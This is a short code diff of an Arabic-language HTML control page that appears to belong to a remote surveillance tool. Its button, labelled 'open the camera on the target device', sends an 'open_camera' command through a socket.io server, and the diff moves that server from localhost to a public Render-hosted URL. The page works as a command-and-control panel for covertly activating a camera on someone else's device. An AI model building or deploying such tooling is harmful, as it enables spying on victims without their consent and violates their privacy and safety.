@@ -16,13 +16,13 @@
     <button onclick="sendCommand()">افتح الكاميرا في الجهاز الهدف</button>
 
     <script>
-        // الاتصال بنفس السيرفر
-        const socket = io("http://localhost:3000");
+        // ضع نفس رابط السيرفر الخاص بك من Render هنا أيضاً
+        const socket = io("https://your-server-name.onrender.com");
 
         function sendCommand() {
             // إرسال أمر فتح الكاميرا للسيرفر
             socket.emit('send_command', 'open_camera');
-            alert('تم إرسال الأمر!');
+            alert('تم إرسال الأمر بنجاح!');
         }
     </script>
 </body>
